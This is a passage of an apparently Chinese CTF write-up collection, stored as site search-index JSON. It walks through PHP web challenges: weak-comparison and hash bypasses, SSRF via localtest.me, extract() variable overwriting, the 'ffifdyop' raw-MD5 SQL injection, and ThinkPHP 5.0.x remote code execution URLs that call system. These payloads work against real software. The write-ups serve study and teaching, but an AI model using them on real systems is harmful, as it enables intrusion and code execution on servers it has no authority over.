strstr()","text":"<p>\u6253\u5f00\u7f51\u9875\u7ed9\u51fa\u4e86\u6e90\u4ee3\u7801</p> <p><code>strstr()</code> \u7528\u4e8e\u67e5\u627e\u5b57\u7b26\u4e32\u9996\u6b21\u51fa\u73b0\u7684\u4f4d\u7f6e\uff08\u533a\u5206\u5927\u5c0f\u5199\uff09</p> <p><code>str_replace()</code> \u4ee5\u5176\u4ed6\u5b57\u7b26\u66ff\u6362\u5b57\u7b26\u4e32\u4e2d\u7684\u4e00\u4e9b\u5b57\u7b26\uff08\u533a\u5206\u5927\u5c0f\u5199\uff09</p> <pre><code>&lt;?php\nshow_source(__FILE__);\necho $_GET['hello'];\n$page=$_GET['page'];\nwhile (strstr($page, \"php://\")) {\n    $page=str_replace(\"php://\", \"\", $page);\n}\ninclude($page);\n?&gt;\n</code></pre> <p>\u6240\u4ee5\u53ef\u4ee5\u7528\u5927\u5c0f\u5199\u7ed5\u8fc7 <code>strstr()</code> \u518d\u914d\u5408\u4f2a\u534f\u8bae <code>php://input</code> \u6267\u884c\u547d\u4ee4</p> <p></p>"},{"location":"Web/Chapter2/2-22/","title":"0e \u79d1\u5b66\u8ba1\u6570\u6cd5\u7ed5\u8fc7 MD4 \u5f31\u6bd4\u8f83","text":""},{"location":"Web/Chapter2/2-22/#0e-\u79d1\u5b66\u8ba1\u6570\u6cd5\u7ed5\u8fc7-md4-\u5f31\u6bd4\u8f83","title":"0e \u79d1\u5b66\u8ba1\u6570\u6cd5\u7ed5\u8fc7 MD4 \u5f31\u6bd4\u8f83","text":"<p>\u6253\u5f00\u7f51\u9875\u4e0d\u8ba9 F12 \u4ee5\u53ca\u53f3\u952e</p> <p></p> <p>Ctrl + U \u53d1\u73b0\u6709\u4e2a PHP \u6587\u4ef6</p> <p></p> <p>\u8bbf\u95ee\u9875\u9762\u540e\u518d\u6b21\u67e5\u770b\u6e90\u7801\u7ed9\u51fa\u4e86\u63d0\u793a</p> <p></p> <p>\u5b89\u88c5\u5de5\u5177</p> <pre><code>pip install arjun\n</code></pre> <p></p> <p>\u6267\u884c\u547d\u4ee4</p> <pre><code>arjun -u http://challenge.qsnctf.com:31303/c3s4f.php\n</code></pre> <p>\u53ef\u4ee5\u53d1\u73b0\u6709\u4e2a <code>shell</code> \u53c2\u6570</p> <p></p> <p>\u4f20\u5165\u53c2\u6570\u7ed9\u51fa\u4e86\u65b0\u63d0\u793a</p> <p></p> <p>\u626b\u63cf\u76ee\u5f55\u53d1\u73b0\u6709\u4e2a <code>secret.php</code></p> <p></p> <p>\u53ea\u5141\u8bb8\u672c\u5730\u8bbf\u95ee</p> <p></p> <p>\u7ed3\u5408\u63d0\u793a\u4ee5\u4e3a\u662f\u8981\u4f2a\u9020 XFF \u6216\u8005 Client-IP\uff0c\u8bd5\u8fc7\u4e86\u90fd\u4e0d\u884c</p> <p>\u5229\u7528 <code>shell</code> \u53c2\u6570\u6784\u9020 SSRF</p> <pre><code>?shell=http://127.0.0.1/secret.php\n</code></pre> <p>\u65e0\u679c</p> <p></p> <p>\u4f7f\u7528\u57df\u540d\u8df3\u8f6c\u7ed5\u8fc7</p> <pre><code>?shell=http://localtest.me/secret.php\n</code></pre> <p></p> <p>\u8bbf\u95ee\u62ff\u5230\u6e90\u7801</p> <p></p> <pre><code>&lt;?php\nshow_source(__FILE__);\ninclude('k4y.php');\ninclude_once('flag.php');\n\n\n// Challenge 1\nif (isset($_GET['DrKn'])) {\n    $text = $_GET['DrKn'];\n    if(@file_get_contents($text) == $key) {\n        echo \"\u6709\u70b9\u4e1c\u897f\u5462\".\"&lt;/br&gt;\".$key1.\"&lt;/br&gt;\";\n    } else {\n        die(\"\u8c8c\u4f3c\u72b6\u6001\u4e0d\u5728\u7ebf\u554a(\u256f_\u2570)&lt;/br&gt;\");\n    }\n} \n\n\n// Challenge 2\nif (isset($_GET[$key1])) {\n    $damei = $_GET[$key1];\n    if (hash(\"md4\", $damei) == $damei) {\n        echo \"\u53c8\u8fd1\u4e86\u4e00\u6b65\u5462\uff0c\u5b9d~\".\"&lt;/br&gt;\".$key2.\"&lt;/br&gt;\".$key3;\n    } else {\n        die(\"\u8fbe\u54a9\u54df~\");\n    }\n} \n\n\n// Challenge 3\nif (isset($_POST[$key2]) &amp;&amp; isset($_POST[$key3])) {\n    $user = $_POST[$key2];\n    $pass = $_POST[$key3];\n\n    if (strlen($user) &gt; 4 || strlen($pass) &gt; 5) {\n          die(\"\u8fd8\u5f97\u7ec3\");\n      }\n     if ($user !== $pass &amp;&amp; md5($user) === md5($pass)) {  \n          echo \"\u8fd8\u4e0d\u9519\u54e6\".\"$flag\";\n      }\n      else {\n          die(\"nonono\") ;\n      }\n    }\n\n?&gt;\n</code></pre> <p>\u7b2c\u4e00\u5173\u5c31\u662f\u4f20\u5165\u7ed9\u51fa\u7684 Key\uff0c\u4f46\u662f\u9700\u8981\u7528\u5230 <code>data</code> \u4f2a\u534f\u8bae</p> <p></p> <p>\u7b2c\u4e8c\u5173\u662f\u4e00\u4e2a <code>md4</code> \u7684\u5f31\u6bd4\u8f83\u7ed5\u8fc7\uff0c\u5176\u5b9e\u53ef\u4ee5\u901a\u8fc7\u79d1\u5b66\u8ba1\u7b97\u6cd5\u6bd4\u8f83\u7ed5\u8fc7</p> <p>\u4e5f\u5c31\u662f\u8bf4\u8981\u627e\u4e00\u4e2a\u660e\u6587\u662f\u4e00\u4e2a\u79d1\u5b66\u8ba1\u7b97\u6cd5 0e \u5f00\u5934\u7684\uff0c\u7136\u540e\u5176\u52a0\u5bc6\u4e5f\u662f 0e \u5f00\u5934\u540e\u9762\u90fd\u662f\u6570\u5b57</p> <pre><code>&amp;M_ore.8=0e001233333333333334557778889\n</code></pre> <p>\u6700\u540e\u4e00\u5173\u5c31\u662f <code>md5</code> \u5f3a\u6bd4\u8f83\u7ed5\u8fc7\uff0c\u90fd\u4e3a\u6570\u7ec4\u5373\u53ef</p> <p></p>"},{"location":"Web/Chapter2/2-23/","title":"extract() \u53d8\u91cf\u8986\u76d6","text":""},{"location":"Web/Chapter2/2-23/#extract-\u53d8\u91cf\u8986\u76d6","title":"extract() \u53d8\u91cf\u8986\u76d6","text":"<p>\u626b\u63cf\u76ee\u5f55\u53d1\u73b0\u6709\u4e2a <code>index.php.bak</code></p> <pre><code>&lt;?php \nerror_reporting(0);\n$token = $_COOKIE['token'] ?? null;\n\nif($token){\n    extract($_GET);\n    $token = base64_decode($token);\n    $token = json_decode($token, true);\n\n\n    $username = $token['username'];\n    $password = $token['password'];\n    $isLocal = false;\n\n    if($_SERVER['REMOTE_ADDR'] == \"127.0.0.1\"){\n        $isLocal = true;\n    }\n\n    if($isLocal){\n        echo 'Welcome Back\uff0c' . $username . '!';\n        if(file_exists('upload/' . $username . '/' . $token['filename'])){\n            echo '&lt;br&gt;';\n            echo '&lt;img src=\"upload/' . $username . '/' . $token['filename'] .'\" width=\"200\"&gt;';\n        } else {\n            echo '\u8bf7\u4e0a\u4f20\u60a8\u9ad8\u8d35\u7684\u5934\u50cf\u3002';\n            $html = &lt;&lt;&lt;EOD\n            &lt;form method=\"post\" action=\"upload.php\" enctype=\"multipart/form-data\"&gt;\n                &lt;input type=\"file\" name=\"file\" id=\"file\"&gt;\n                &lt;input type=\"submit\" value=\"Upload\"&gt;\n            &lt;/form&gt;\n            EOD;\n            echo $html;\n        }\n    } else {\n        // echo \"\u7559\u4e2a\u8a00\u5427\";\n        $html = &lt;&lt;&lt;EOD\n        &lt;h1&gt;\u7559\u8a00\u677f&lt;/h1&gt;\n        &lt;label for=\"input-text\"&gt;Enter some text:&lt;/label&gt;\n        &lt;input type=\"text\" id=\"input-text\" placeholder=\"Type here...\"&gt;\n        &lt;button onclick=\"displayInput()\"&gt;Display&lt;/button&gt;\n        EOD;\n        echo $html;\n    }\n} else {\n    $html = &lt;&lt;&lt;EOD\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;Login&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;h2&gt;Login&lt;/h2&gt;\n    &lt;form method=\"post\" action=\"./login.php\"&gt;\n        &lt;div&gt;\n            &lt;label for=\"username\"&gt;Username:&lt;/label&gt;\n            &lt;input type=\"text\" name=\"username\" id=\"username\" required&gt;\n        &lt;/div&gt;\n        &lt;div&gt;\n            &lt;label for=\"password\"&gt;Password:&lt;/label&gt;\n            &lt;input type=\"password\" name=\"password\" id=\"password\" required&gt;\n        &lt;/div&gt;\n        &lt;div&gt;\n            &lt;input type=\"submit\" value=\"Login\"&gt;\n        &lt;/div&gt;\n    &lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\nEOD;\n    echo $html;\n}\n?&gt;\n\n&lt;script&gt;\n    function displayInput() {\n      var inputText = document.getElementById(\"input-text\").value;\n      document.write(inputText)\n    }\n&lt;/script&gt;\n</code></pre> <p>\u4e3b\u8981\u529f\u80fd\u6d41\u7a0b\uff1a</p> <ol> <li>\u83b7\u53d6 Cookie \u4e2d\u7684 <code>token</code> \u503c</li> </ol> <pre><code>$token = $_COOKIE['token'] ?? null;\n</code></pre> <ol> <li>\u89e3\u6790 <code>token</code> \u5185\u5bb9</li> </ol> <pre><code>$token = base64_decode($token);\n$token = json_decode($token, true);\n</code></pre> <ol> <li>\u5224\u65ad\u8bbf\u95ee\u8005\u662f\u5426\u4e3a <code>127.0.0.1</code></li> </ol> <pre><code>if ($_SERVER['REMOTE_ADDR'] == \"127.0.0.1\")\n</code></pre> <ol> <li>\u672c\u5730\u7528\u6237\u529f\u80fd</li> </ol> <p>\u663e\u793a\u6b22\u8fce\u8bed\uff1b</p> <p>\u68c0\u67e5\u5934\u50cf\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff1b</p> <p>\u82e5\u5b58\u5728\u5219\u5c55\u793a\u5934\u50cf\uff1b</p> <p>\u82e5\u4e0d\u5b58\u5728\u5219\u63d0\u793a\u4e0a\u4f20\u8868\u5355\uff08\u63d0\u4ea4\u5230 <code>upload.php</code>\uff09</p> <ol> <li>\u8fdc\u7a0b\u7528\u6237\u529f\u80fd\uff1a</li> </ol> <p>\u663e\u793a\u7559\u8a00\u677f\uff08\u524d\u7aef HTML + JS \u52a8\u6001\u5c55\u793a\uff09</p> <ol> <li>\u672a\u767b\u5f55\u7528\u6237</li> </ol> <p>\u663e\u793a\u767b\u5f55\u8868\u5355\uff0c\u63d0\u4ea4\u81f3 <code>login.php</code></p> <p>extract($_GET) \u5de5\u4f5c\u539f\u7406\uff1a</p> <pre><code>&lt;?php\nextract($_GET);\necho \"Hello, $name!\";\n?&gt;\n</code></pre> <p>\u8bf7\u6c42\uff1a</p> <pre><code>http://example.com/index.php?name=Alice\n</code></pre> <p>\u7ed3\u679c\uff1a</p> <pre><code>Hello, Alice!\n</code></pre> <p>\u53d8\u91cf\u6c61\u67d3\u653b\u51fb\uff1a</p> <pre><code>&lt;?php\n$token = \"secure-token\";\nextract($_GET);\necho \"Token is: $token\";\n?&gt;\n</code></pre> <p>\u8bf7\u6c42\uff1a</p> <pre><code>http://example.com/index.php?token=hacked\n</code></pre> <p>\u7ed3\u679c\uff1a</p> <pre><code>Token is: hacked\n</code></pre> <p><code>extract($GET);</code> \u5b58\u5728\u53d8\u91cf\u8986\u76d6\uff0c\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u628a <code>$SERVER['REMOTE_ADDR']</code> \u8986\u76d6\u6210 <code>127.0.0.1</code></p> <pre><code>?_SERVER[REMOTE_ADDR]=127.0.0.1\n</code></pre> <p>\u9996\u5148\u767b\u5f55</p> <p></p> <p>\u7136\u540e\u6c61\u67d3\u627e\u5230\u6587\u4ef6\u4e0a\u4f20\u70b9</p> <p></p> <p>\u4e0a\u4f20\u6210\u529f\u540e\u6ca1\u6709\u8fd4\u56de\u8def\u5f84\uff0c\u5728\u6e90\u7801\u4e0a\u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a</p> <pre><code>if(file_exists('upload/' . $username . '/' . $token['filename']))\n</code></pre> <p>\u731c\u6d4b\u6587\u4ef6\u4e0a\u4f20\u5230 <code>/upload/[username]/[filename]</code>\uff0c\u5c1d\u8bd5\u53d1\u73b0\u662f\u6b63\u786e\u7684</p> <p>\u5f53\u5b58\u5728 <code>username</code> \u65f6\uff0c\u65e0\u8bba\u4e0a\u4f20\u4ec0\u4e48\u90fd\u4e0d\u80fd\u88ab\u89e3\u6790\u6210 PHP \u4ee3\u7801</p> <p>\u628a <code>username</code> \u7f6e\u7a7a\uff0c\u6210\u529f\u5c06\u6587\u4ef6\u4e0a\u4f20\u5230 upload \u76ee\u5f55</p> <pre><code>token=eyJ1c2VybmFtZSI6IiIsInBhc3N3b3JkIjoiIn0=\n</code></pre> <p></p>"},{"location":"Web/Chapter2/2-24/","title":"\u6d6e\u70b9\u6570\u7ed5\u8fc7 intval()","text":""},{"location":"Web/Chapter2/2-24/#\u6d6e\u70b9\u6570\u7ed5\u8fc7-intval","title":"\u6d6e\u70b9\u6570\u7ed5\u8fc7 intval()","text":"<p>\u6253\u5f00\u7f51\u9875\u7ed9\u51fa\u6e90\u7801</p> <p></p> <p>\u8be5\u4ee3\u7801\u9996\u5148\u68c0\u67e5 <code>$num</code> \u662f\u5426\u7b49\u4e8e 114514\uff0c\u5982\u679c\u662f\uff0c\u5219\u7ec8\u6b62\u6267\u884c</p> <p>\u63a5\u7740\uff0c\u4f7f\u7528 <code>intval($num, 0)</code> \u5224\u65ad\u5176\u6574\u6570\u503c\u662f\u5426\u4e3a 114514</p> <p>\u7531\u4e8e\u6d6e\u70b9\u6570\u7684\u7cbe\u5ea6\u95ee\u9898\uff0c\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u7565\u5927\u4e8e 114514 \u7684\u6d6e\u70b9\u6570\uff0c\u5982 <code>114514.1</code>\uff0c\u4f7f\u5f97</p> <pre><code>intval(114514.1) == 114514\n</code></pre> <p>\u800c\u539f\u59cb\u503c <code>114514.1</code> \u4e0e\u6574\u6570 <code>114514</code> \u4e0d\u76f8\u7b49\uff0c\u56e0\u6b64\u7ed5\u8fc7\u4e86\u7b2c\u4e00\u4e2a\u5224\u65ad</p> <p></p>"},{"location":"Web/Chapter2/2-25/","title":"call_user_func() \u52a8\u6001\u8c03\u7528","text":""},{"location":"Web/Chapter2/2-25/#call_user_func-\u52a8\u6001\u8c03\u7528","title":"call_user_func() \u52a8\u6001\u8c03\u7528","text":"<p>\u6253\u5f00\u9875\u9762\u7ed9\u51fa\u4e86\u6e90\u7801</p> <pre><code>&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nextract($_GET);\n\n$token = false;\nif(isset($param1) &amp;&amp; isset($param2)){\n    if(sha1($param1) == sha1($param2)){\n        $token = true;\n        echo \"Level 1 pass\\n\";\n    }\n}\n\nclass TYctf{\n    public $person = 20;\n    public $computer_number = 30;\n\n    function getNumber(){\n        if(isset($this-&gt;person)) {\n            echo $this-&gt;person;\n        }\n    }\n    function isFullUse(){\n        if($this-&gt;person != $this-&gt;computer_number){\n            echo \"computer is lacking !!!\\n\";\n        }\n        else{\n            echo \"computer is enough !!!\\n\";\n        }\n    }\n    static function getKey(){\n        include (\"flag.php\");\n        echo \"Level 2 pass\\n\";\n        echo \"You are winner, this is your reward: \\n\";\n        echo $flag;\n    }\n}\n\nif($token){\n    call_user_func($_POST['payload']);\n}\n\n?&gt;\n</code></pre> <p>\u7b2c\u4e00\u5173\u8ba9 <code>param1</code> \u548c <code>param2</code> \u4f20\u9012\u7684\u503c\u76f8\u540c\u5373\u53ef</p> <p>\u7b2c\u4e8c\u5173\u5f53 <code>$token</code> \u4e3a <code>true</code> \u65f6\uff0c\u4ee3\u7801\u6267\u884c</p> <pre><code>call_user_func($_POST['payload']);\n</code></pre> <p>\u8fd9\u610f\u5473\u7740\u53ef\u4ee5\u901a\u8fc7 POST \u8bf7\u6c42\u4e2d\u7684 <code>payload</code> \u53c2\u6570\u8c03\u7528\u4efb\u610f\u51fd\u6570</p> <p>\u9898\u76ee\u4e2d\u5b9a\u4e49\u4e86\u4e00\u4e2a\u7c7b <code>TYctf</code>\uff0c\u5176\u4e2d\u6709\u4e00\u4e2a\u9759\u6001\u65b9\u6cd5 <code>getKey()</code>\uff0c\u8be5\u65b9\u6cd5\u5305\u542b\u4e86 <code>flag.php</code> \u6587\u4ef6\u5e76\u8f93\u51fa <code>$flag</code></p> <p>\u56e0\u6b64\u8bbe\u7f6e payload</p> <pre><code>payload=TYctf::getKey\n</code></pre> <p></p>"},{"location":"Web/Chapter2/2-26/","title":"md5($pass,true) \u7ed5\u8fc7","text":""},{"location":"Web/Chapter2/2-26/#md5passtrue-\u7ed5\u8fc7","title":"md5($pass,true) \u7ed5\u8fc7","text":"<p>\u770b\u54cd\u5e94\u5305\u62ff\u5230\u63d0\u793a</p> <p></p> <p>\u6f0f\u6d1e\u4ee3\u7801\u5982\u4e0b</p> <pre><code>select * from 'admin' where password=md5($pass,true)\n</code></pre> <p>\u9700\u8981 <code>password=md5($pass,true)</code> \u6761\u4ef6\u4e3a\u771f\u65f6\uff0c\u624d\u4f1a\u6267\u884c <code>select * form admin</code></p> <p><code>md5()</code> \u51fd\u6570\u4f1a\u5c06\u6211\u4eec\u8f93\u5165\u7684\u503c\uff0c\u52a0\u5bc6\uff0c\u7136\u540e\u8f6c\u6362\u6210 16 \u5b57\u7b26\u7684\u4e8c\u8fdb\u5236\u683c\u5f0f</p> <p>\u7531\u4e8e ffifdyop \u88ab md5 \u52a0\u5bc6\u540e\u7684 <code>276f722736c95d99e921722cf9ed621c</code> \u8f6c\u6362\u6210 16 \u4f4d\u539f\u59cb\u4e8c\u8fdb\u5236\u683c\u5f0f\u4e3a<code>'or'6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c</code></p> <p>\u8fd9\u4e2a\u5b57\u7b26\u4e32\u524d\u51e0\u4f4d\u521a\u597d\u662f <code>'or'6</code></p> MD5\u52a0\u5bc6 276F722736C95D99E921722CF9ED621C 16\u4f4d\u539f\u59cb\u4e8c\u8fdb\u5236\u683c\u5f0f 'or'6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c string 'or'6]!r,b <p>\u6240\u4ee5\u8f93\u5165 ffifdyop \u540e\uff0c\u5185\u90e8\u6267\u884c\u8bed\u53e5\u5c31\u4f1a\u53d8\u4e3a</p> <pre><code>select * from 'admin' where password='or'6\ufffd]\ufffd\ufffd!r,\ufffd\ufffdb'\n</code></pre> <p>\u8fd9\u6837\u5c31\u6210\u6c38\u771f\u6761\u4ef6\u4e86</p>"},{"location":"Web/Chapter2/2-3/","title":"0e \u79d1\u5b66\u8ba1\u6570\u6cd5\u7ed5\u8fc7 MD5 \u5f31\u6bd4\u8f83","text":""},{"location":"Web/Chapter2/2-3/#0e-\u79d1\u5b66\u8ba1\u6570\u6cd5\u7ed5\u8fc7-md5-\u5f31\u6bd4\u8f83","title":"0e \u79d1\u5b66\u8ba1\u6570\u6cd5\u7ed5\u8fc7 MD5 \u5f31\u6bd4\u8f83","text":"<p>\u7ee7\u4e0a\u4e00\u8282 str_replace \u51fd\u6570\u7ed5\u8fc7</p> <p></p> <p>\u540e\u534a\u90e8\u5206\u5bf9 key1 \u548c key2 \u7684\u503c\u8fdb\u884c MD5 \u52a0\u5bc6\u4e4b\u540e\u6bd4\u8f83</p> <p>\u5982\u679c md5 \u52a0\u5bc6\u7684\u503c\u4e00\u6837\u800c\u672a\u52a0\u5bc6\u7684\u503c\u4e0d\u540c\uff0c\u5c31\u8f93\u51faflag</p> <p>\u5f31\u6bd4\u8f83\u4f1a\u5c06 0e \u5f00\u5934\u7684\u8bc6\u522b\u4e3a\u79d1\u5b66\u8ba1\u6570\u6cd5\uff0c0 \u7684 n \u6b21\u65b9\u5747\u4e3a 0</p> <p>\u5f97\u5230\u7684\u503c\u6bd4\u8f83\u7684\u65f6\u5019\u90fd\u76f8\u540c</p> <p></p> <p>\u6784\u9020 payload \u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter2/2-4/","title":"$$ \u8d85\u7ea7\u5168\u5c40\u53d8\u91cf\u6cc4\u9732","text":""},{"location":"Web/Chapter2/2-4/#-\u8d85\u7ea7\u5168\u5c40\u53d8\u91cf\u6cc4\u9732","title":"$$ \u8d85\u7ea7\u5168\u5c40\u53d8\u91cf\u6cc4\u9732","text":"<p>\u4ee3\u7801\u5ba1\u8ba1\u770b\u5230\u6700\u540e\u6267\u884c\u4e86\u4e24\u4e2a $$</p> <p></p> <p>\u591a\u51fa\u7684 $ \u53ef\u4ee5\u7ec4\u6210 PHP \u4e2d\u7684\u8d85\u7ea7\u5168\u5c40\u53d8\u91cf\uff0c$GLOBALS \u662f\u4e00\u4e2a\u5305\u542b\u4e86\u5168\u90e8\u53d8\u91cf\u7684\u5168\u5c40\u7ec4\u5408\u6570\u7ec4</p> <p></p> <p>\u6784\u9020 payload \u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter2/2-5/","title":"\u6570\u7ec4\u7ed5\u8fc7 strcmp()","text":""},{"location":"Web/Chapter2/2-5/#\u6570\u7ec4\u7ed5\u8fc7-strcmp","title":"\u6570\u7ec4\u7ed5\u8fc7 strcmp()","text":"<p>\u6253\u5f00\u7f51\u9875\u662f\u6df1\u60c5\u6587\u6848</p> <p></p> <p>\u67e5\u770b\u6e90\u4ee3\u7801\u53d1\u73b0\u4e00\u4e2a\u94fe\u63a5</p> <p></p> <p>\u8bbf\u95ee\u62ff\u5230\u7f51\u7ad9\u6e90\u7801</p> <p></p> <p>MD5 \u5f31\u6bd4\u8f83\u4e4b\u524d\u8bb2\u8fc7\uff0c\u91cd\u70b9\u770b strcmp \u51fd\u6570</p> <p>strcmp() \u51fd\u6570\u6bd4\u8f83\u4e24\u4e2a\u5b57\u7b26\u4e32\uff0c\u4e14\u533a\u5206\u5927\u5c0f\u5199</p> <p>\u53ef\u4ee5\u770b\u5230\u5f53\u4e24\u4e2a\u5b57\u7b26\u4e32\u76f8\u540c\u65f6\u8fd4\u56de\u503c\u662f 0</p> <p></p> <p>\u4f46\u5f53\u51fd\u6570\u63a5\u53d7\u5230\u4e0d\u7b26\u5408\u5b57\u7b26\u4e32\u7c7b\u578b\u7684\u53c2\u6570\u5c31\u4f1a\u53d1\u751f\u9519\u8bef\uff0c\u5e76\u4e14\u4e5f\u8fd4\u56de 0</p> <p>\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u63d0\u4ea4\u4e00\u4e2a\u975e\u5b57\u7b26\u4e32\u7c7b\u578b\u7684\u53c2\u6570\u4f7f\u5176\u8fd4\u56de 0\uff0c\u6bd4\u5982\u4f7f\u7528\u6570\u7ec4\u7c7b\u578b</p> <p>\u6784\u9020 payload</p> <pre><code>?v1=QNKCDZO&amp;v2=s878926199a&amp;v3[]=66\n</code></pre> <p></p>"},{"location":"Web/Chapter2/2-6/","title":"\u6570\u7ec4\u7ed5\u8fc7 SHA1()","text":""},{"location":"Web/Chapter2/2-6/#\u6570\u7ec4\u7ed5\u8fc7-sha1","title":"\u6570\u7ec4\u7ed5\u8fc7 SHA1()","text":"<p>\u6253\u5f00\u9875\u9762\u7ed9\u51fa\u4e86\u6e90\u7801\uff0c\u8fd9\u91cc\u7528\u4e86\u5f3a\u6bd4\u8f83</p> <p>sha1() \u51fd\u6570\u65e0\u6cd5\u5904\u7406\u6570\u7ec4\uff0c\u5982\u679c\u4f20\u5165\u7684\u4e3a\u6570\u7ec4\uff0c\u4f1a\u8fd4\u56de NULL</p> <p>\u7531\u6b64\u6211\u4eec\u53ef\u4ee5\u4f20\u5165\u4e24\u4e2a\u6570\u7ec4\u4f7f\u6761\u4ef6\u6210\u7acb</p> <p></p> <p>\u5148\u6784\u9020 Get \u53c2\u6570\uff0cBurpSuite \u62e6\u622a\u6293\u5305\u53d1\u9001\u5230 Repeater \u6a21\u5757</p> <p></p> <p>\u65b9\u6cd5\u6539\u4e3a POST\uff0c\u518d\u4f20\u5165 passwd \u4e3a\u6570\u7ec4\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter2/2-7/","title":"%00 \u7ed5\u8fc7 eregi()","text":""},{"location":"Web/Chapter2/2-7/#00-\u7ed5\u8fc7-eregi","title":"%00 \u7ed5\u8fc7 eregi()","text":"<p>\u6253\u5f00\u7f51\u9875\u5565\u4e5f\u6ca1\u6709</p> <p></p> <p>\u5728\u7f51\u7edc\u8bf7\u6c42\u4e2d\u627e\u5230\u7ebf\u7d22</p> <p></p> <p>\u8bbf\u95ee\u65f6\u8df3\u8f6c\u5230\u4e86 BugKu \u9996\u9875\uff0cview-source: \u67e5\u770b\u6e90\u7801</p> <p></p> <p>\u89e3\u7801\uff1aURL \u27a1 Base64 \u27a1 URL\uff0c\u5f97\u5230\u6e90\u4ee3\u7801</p> <p></p> <p>eregi() \u51fd\u6570\u5b58\u5728\u7a7a\u5b57\u7b26\u622a\u65ad\u6f0f\u6d1e\uff0c\u5982\u9047\u5230 %00 \u5219\u622a\u65ad\u4e22\u5f03\u540e\u9762\u7684\u6570\u636e</p> <p>\u5219\u4f20\u53c2 \\(b=%0011111\uff08\u957f\u5ea6\u5927\u4e8e 5\uff09\uff0c\\)id=asdg\uff08\u5b57\u7b26\u7ed5\u8fc7\u5f31\u6bd4\u8f83\uff09\uff0c%a=php://input\uff08\u4f20 POST \u6570\u636e\uff09</p> <p></p>"},{"location":"Web/Chapter2/2-8/","title":"\u5927\u5c0f\u5199\u7ed5\u8fc7 strpos()","text":""},{"location":"Web/Chapter2/2-8/#\u5927\u5c0f\u5199\u7ed5\u8fc7-strpos","title":"\u5927\u5c0f\u5199\u7ed5\u8fc7 strpos()","text":"<p>\u6253\u5f00\u7f51\u9875\u662f\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20</p> <p></p> <p>\u53ea\u80fd\u6b63\u5e38\u4e0a\u4f20\u56fe\u7247</p> <p></p> <p>\u6e90\u4ee3\u7801\u4f7f\u7528\u4e86 strpos \u51fd\u6570\uff0c\u8be5\u51fd\u6570\u533a\u5206\u5927\u5c0f\u5199\uff0c\u6240\u4ee5\u4f7f\u7528\u5927\u5c0f\u5199\u7ed5\u8fc7</p> <p></p> <p>\u4fee\u6539\u7c7b\u578b\u7ed5\u8fc7</p> <p></p>"},{"location":"Web/Chapter2/2-9/","title":"<?= \u66ff\u6362 <? echo","text":""},{"location":"Web/Chapter2/2-9/#-\u66ff\u6362--echo","title":"&lt;?= \u66ff\u6362 &lt;? echo","text":"<p>\u6253\u5f00\u9875\u9762\u7ed9\u51fa\u4e86\u6e90\u4ee3\u7801</p> <p></p> <p>\u9996\u5148\u662f\u957f\u5ea6\u8981\u4e3a 49\uff0c\u5176\u6b21\u7ed5\u8fc7\u8fc7\u6ee4\u7ed5\u8fc7 sha1</p> <p>\u6211\u4eec\u6ce8\u610f\u8981\u8fd9\u6bb5\u4ee3\u7801\u6ca1\u6709\u95ed\u5408 ?&gt;</p> <p>\u5148\u6784\u9020\u8bf7\u6c42\uff1a<code>/?flag=</code></p> <p>\u56e0\u4e3a\u8fc7\u6ee4\u4e86 flag\uff0c\u6240\u6709\u8981\u7528\u53d8\u91cf\u4ee3\u66ff</p> <pre><code>$a=fla6;$a{3}=g;\n</code></pre> <p>\u8981 eval \u51fd\u6570\u8fd9\u91cc\uff0c\u5b83\u4f1a\u628a PHP \u5b57\u7b26\u4e32\u5f53\u4ee3\u7801\u6267\u884c</p> <p>&lt;? ?&gt;\u548c &lt;?= ?&gt; \u662f\u77ed\u6807\u7b7e\u800c &lt;?php ?&gt; \u662f\u957f\u6807\u7b7e\uff0c\u5176\u4e2d &lt;?= \u662f\u4ee3\u66ff &lt;? echo \u7684\u6807\u7b7e</p> <p>\u4e8e\u662f\u5148\u95ed\u5408\u7ed5\u8fc7 sha1\uff0c&lt;?= \u8f93\u51fa\u53d8\u91cf flag</p> <p>\u524d\u9762 $a \u5df2\u7ecf\u662f flag \u5b57\u7b26\u4e32\u4e86\uff0c\u518d\u4f7f\u7528 $a \u7b80\u6d01\u5f15\u7528\u5c31\u662f $flag\uff0c\u6700\u540e\u8865\u6570\u5b57\u8fbe\u5230\u957f\u5ea6</p> <p></p>"},{"location":"Web/Chapter20/20-1/","title":"ThinkPHP v5.0.20 RCE","text":""},{"location":"Web/Chapter20/20-1/#thinkphp-v5020-rce","title":"ThinkPHP v5.0.20 RCE","text":"<p>\u6253\u5f00\u9875\u9762\u63d0\u793a\u4e86 ThinkPHP v5</p> <p></p> <p>\u8bd5\u4e86\u4e0b NDay \u7684 payload \u62a5\u9519\uff0c\u5e76\u7ed9\u51fa\u4e86\u5177\u4f53\u7248\u672c</p> <pre><code>/?s=index/\\think\\View/display&amp;content=%22%3C?%3E%3C?php%20phpinfo();?%3E&amp;data=1\n</code></pre> <p></p> <p>\u6709\u4e86\u5177\u4f53\u7684\u7248\u672c\u53f7\u5c31\u597d\u641e\u4e86</p> <pre><code>/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id\n</code></pre> <p></p>"},{"location":"Web/Chapter20/20-2/","title":"ThinkPHP \u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe","text":""},{"location":"Web/Chapter20/20-2/#thinkphp-\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe","title":"ThinkPHP \u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe","text":"<p>\u8bbf\u95ee\u73af\u5883\u65f6\u63d0\u793a\u4e0b\u8f7d\u6e90\u4ee3\u7801 <code>www.zip</code></p> <p></p> 